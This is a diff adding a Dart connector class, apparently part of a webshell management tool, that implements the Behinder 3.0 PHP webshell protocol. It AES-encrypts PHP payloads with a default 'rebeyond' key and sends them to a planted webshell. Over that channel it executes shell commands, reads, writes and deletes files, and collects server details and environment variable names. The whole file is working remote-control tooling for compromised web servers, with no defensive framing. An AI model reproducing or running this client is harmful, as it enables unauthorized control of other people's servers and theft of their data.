@@ -1,0 +1,323 @@
+import 'dart:async';
+import 'dart:convert';
+import 'dart:typed_data';
+
+import 'package:encrypt/encrypt.dart' as enc;
+import 'package:http/http.dart' as http;
+
+import 'package:crypto/crypto.dart' as crypto;
+
+import '../models/file_entry.dart';
+import 'shell_connector.dart';
+
+/// `bing.php`：冰蝎 3.0 PHP 协议，AES 加密传输
+///
+/// 密钥 = MD5(连接密码)[0:16]，默认密码 rebeyond → e45e329feb5d925b
+/// POST body = base64(AES_encrypt("C|php_code"))，解密后 explode('|') 取 params，eval 执行
+class PhpBehinderConnector extends ShellConnector {
+  PhpBehinderConnector(super.webshell);
+
+  late final http.Client _client = http.Client();
+  final Map<String, String> _cookies = {};
+
+  String get _aesKey {
+    final pass = webshell.password?.trim().isNotEmpty == true
+        ? webshell.password!.trim()
+        : 'rebeyond';
+    if (pass.length == 16 && _isHex16(pass)) {
+      return pass.toLowerCase();
+    }
+    final md5 = crypto.md5.convert(utf8.encode(pass)).toString();
+    return md5.substring(0, 16);
+  }
+
+  static bool _isHex16(String s) {
+    if (s.length != 16) return false;
+    for (var i = 0; i < 16; i++) {
+      final c = s.codeUnitAt(i);
+      if (!((c >= 0x30 && c <= 0x39) ||
+          (c >= 0x61 && c <= 0x66) ||
+          (c >= 0x41 && c <= 0x46))) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  @override
+  Set<ConnectorCapability> get capabilities => const {
+        ConnectorCapability.codeExec,
+        ConnectorCapability.shellExec,
+        ConnectorCapability.fileRead,
+        ConnectorCapability.fileWrite,
+      };
+
+  /// 当前使用的模式：ECB 或 CBC。部分环境 "AES128" 映射不同，连接后自动探测
+  bool _useCbc = false;
+
+  String _aesEncryptBase64(String plain) {
+    final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
+    if (_useCbc) {
+      final iv = enc.IV(Uint8List(16));
+      final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
+      final encrypted = encrypter.encrypt(plain, iv: iv);
+      return base64.encode(encrypted.bytes);
+    }
+    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
+    final encrypted = encrypter.encrypt(plain);
+    return base64.encode(encrypted.bytes);
+  }
+
+  void _updateCookies(http.Response response) {
+    final raw = response.headers['set-cookie'];
+    if (raw == null) return;
+    final part = raw.split(';').first.trim();
+    final eq = part.indexOf('=');
+    if (eq > 0) _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
+  }
+
+  Map<String, String> _requestHeaders() {
+    final h = <String, String>{'Content-Type': 'application/octet-stream'};
+    if (_cookies.isNotEmpty) {
+      h['Cookie'] = _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+    }
+    return h;
+  }
+
+  /// 冰蝎 PHP 格式：encrypt("C|php_code")，C.__invoke 执行 eval
+  Future<String> _sendPhp(String phpCode) async {
+    try {
+      final payload = 'C|$phpCode';
+      final body = _aesEncryptBase64(payload);
+
+      // 勿用 application/x-www-form-urlencoded：base64 含 + 会被解码为空格导致损坏
+      final response = await _client
+          .post(
+            Uri.parse(webshell.url),
+            headers: _requestHeaders(),
+            body: body,
+          )
+          .timeout(const Duration(seconds: 15));
+
+      _updateCookies(response);
+      if (response.statusCode == 200) return response.body;
+      final snippet = response.body.length > 4096
+          ? '${response.body.substring(0, 4096)}...'
+          : response.body;
+      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
+    } on TimeoutException {
+      return '[Timeout] 连接超时';
+    } on http.ClientException catch (e) {
+      return '[Connection Error] ${e.message}';
+    } catch (e) {
+      return '[Error] $e';
+    }
+  }
+
+  @override
+  Future<bool> ping() async {
+    try {
+      _useCbc = false;
+      var r = await _sendPhp("echo 'MATRIX_PHP_PING';").timeout(const Duration(seconds: 8));
+      if (r.contains('MATRIX_PHP_PING')) return true;
+      _useCbc = true;
+      r = await _sendPhp("echo 'MATRIX_PHP_PING';").timeout(const Duration(seconds: 8));
+      return r.contains('MATRIX_PHP_PING');
+    } catch (_) {
+      return false;
+    }
+  }
+
+  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";
+
+  @override
+  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
+    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
+        ? 'cd ${_sq(workingDir)} && '
+        : '';
+    final b64 = base64.encode(utf8.encode('$cd$cmd'));
+    // 与 php_eval 完全一致，raw string 中 $ 不转义（Dart 仅 ${} 会插值）
+    final code = "\$c=base64_decode('$b64');"
+        r"$o=@shell_exec($c.' 2>&1');"
+        r"if($o===null){$o=@system($c);}echo $o;";
+    final r = await _sendPhp(code);
+    return r.trim();
+  }
+
+  @override
+  Future<String> getCurrentDir() async {
+    final r = (await _sendPhp("echo getcwd();")).trim();
+    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
+    return currentDir;
+  }
+
+  @override
+  Future<List<FileEntry>> listDirectory(String path) async {
+    final b64 = base64.encode(utf8.encode(path));
+    final code = "\$p=base64_decode('$b64');"
+        "\$d=@opendir(\$p);"
+        'if(\$d===false){echo "ERR_OPEN";exit;}'
+        "while((\$f=readdir(\$d))!==false){"
+        "\$fp=\$p.DIRECTORY_SEPARATOR.\$f;"
+        "\$t=is_dir(\$fp)?'d':'f';"
+        "\$s=is_file(\$fp)?@filesize(\$fp):0;"
+        "\$m=date('Y-m-d H:i',@filemtime(\$fp));"
+        "\$r=decoct(@fileperms(\$fp)&0777);"
+        'echo base64_encode(\$f)."|".\$t."|".\$s."|".\$r."|".\$m."\\n";'
+        "}"
+        "closedir(\$d);";
+    final result = await _sendPhp(code);
+    if (result.isEmpty ||
+        result.startsWith('ERR_OPEN') ||
+        result.startsWith('[')) {
+      return [];
+    }
+
+    return result
+        .trim()
+        .split('\n')
+        .where((l) => l.contains('|'))
+        .map((line) {
+          final parts = line.trim().split('|');
+          if (parts.length < 5) return null;
+          String name;
+          try {
+            name = utf8.decode(base64.decode(parts[0]));
+          } catch (_) {
+            name = parts[0];
+          }
+          return FileEntry(
+            name: name,
+            isDirectory: parts[1] == 'd',
+            size: int.tryParse(parts[2]) ?? 0,
+            permissions: parts[3],
+            modified: parts[4],
+          );
+        })
+        .whereType<FileEntry>()
+        .where((e) => e.name != '.')
+        .toList()
+      ..sort((a, b) {
+        if (a.name == '..') return -1;
+        if (b.name == '..') return 1;
+        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
+        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
+      });
+  }
+
+  @override
+  Future<String> readFile(String path) async {
+    final b64 = base64.encode(utf8.encode(path));
+    return _sendPhp(
+      "\$p=base64_decode('$b64');"
+      r"echo file_exists($p)?file_get_contents($p):'[文件不存在或无权读取]';",
+    );
+  }
+
+  @override
+  Future<bool> writeFile(String path, String content) async {
+    final pathB64 = base64.encode(utf8.encode(path));
+    final contentB64 = base64.encode(utf8.encode(content));
+    final r = await _sendPhp(
+      "\$p=base64_decode('$pathB64');"
+      "\$c=base64_decode('$contentB64');"
+      r"echo file_put_contents($p,$c)!==false?'1':'0';",
+    );
+    return r.trim() == '1';
+  }
+
+  @override
+  Future<bool> deleteFile(String path) async {
+    final b64 = base64.encode(utf8.encode(path));
+    final r = await _sendPhp(
+      "\$p=base64_decode('$b64');"
+      r"echo @unlink($p)?'1':'0';",
+    );
+    return r.trim() == '1';
+  }
+
+  @override
+  Future<Map<String, String>> getSystemInfo() async {
+    // 长 payload 易触发 500，改为 base64 包装：仅加密 eval(base64_decode('...'))
+    const inner = r'''
+$info=[];
+$info['OS']=php_uname();
+$info['PHP版本']=phpversion();
+$u=get_current_user();
+if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){
+  $r=@posix_getpwuid(@posix_geteuid());
+  if(is_array($r)&&isset($r['name']))$u=$r['name'];
+}
+$info['运行用户']=$u;
+$info['当前目录']=getcwd();
+$info['文档根目录']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
+$info['服务器软件']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
+$info['服务器IP']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname(@gethostname());
+$info['内存限制']=ini_get('memory_limit');
+$info['最大执行时间']=ini_get('max_execution_time').'s';
+$info['禁用函数']=ini_get('disable_functions')?:'无';
+$info['Safe Mode']=(@ini_get('safe_mode')||(bool)@ini_get('safe_mode'))?'On':'Off';
+$info['已加载扩展']=implode(', ',@get_loaded_extensions());
+foreach($info as $k=>$v){
+  echo base64_encode($k).'|'.base64_encode((string)$v)."\n";
+}
+''';
+    final b64 = base64.encode(utf8.encode(inner));
+    final result = await _sendPhp("eval(base64_decode('$b64'));");
+    final map = <String, String>{};
+    if (result.isEmpty || result.startsWith('[')) return map;
+    for (final line in result.trim().split('\n')) {
+      final idx = line.indexOf('|');
+      if (idx > 0) {
+        try {
+          final key =
+              utf8.decode(base64.decode(line.substring(0, idx).trim()));
+          final val =
+              utf8.decode(base64.decode(line.substring(idx + 1).trim()));
+          map[key] = val;
+        } catch (_) {}
+      }
+    }
+    return map;
+  }
+
+  @override
+  Future<List<({String name, bool isDir})>> listNamesForCompletion(
+      String path) async {
+    final b64 = base64.encode(utf8.encode(path));
+    final code = "\$p=base64_decode('$b64');"
+        r"$d=@opendir($p);"
+        r"if($d===false){exit;}"
+        r"while(($f=readdir($d))!==false){"
+        r"if($f==='.'||$f==='..'){continue;}"
+        r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
+        r"echo base64_encode($f).'|'.$t.chr(10);"
+        r"}closedir($d);";
+    final result = await _sendPhp(code);
+    if (result.isEmpty || result.startsWith('[')) return [];
+    final out = <({String name, bool isDir})>[];
+    for (final line in result.trim().split('\n')) {
+      final parts = line.trim().split('|');
+      if (parts.length < 2) continue;
+      try {
+        final name = utf8.decode(base64.decode(parts[0]));
+        out.add((name: name, isDir: parts[1] == 'd'));
+      } catch (_) {}
+    }
+    out.sort((a, b) => a.name.compareTo(b.name));
+    return out;
+  }
+
+  @override
+  Future<String> getHomeDir() async =>
+      (await _sendPhp(r"echo getenv('HOME');")).trim();
+
+  @override
+  Future<List<String>> listEnvVarNames() async {
+    final result = await _sendPhp(
+        r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}");
+    if (result.isEmpty || result.startsWith('[')) return [];
+    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
+      ..sort();
+  }
+}
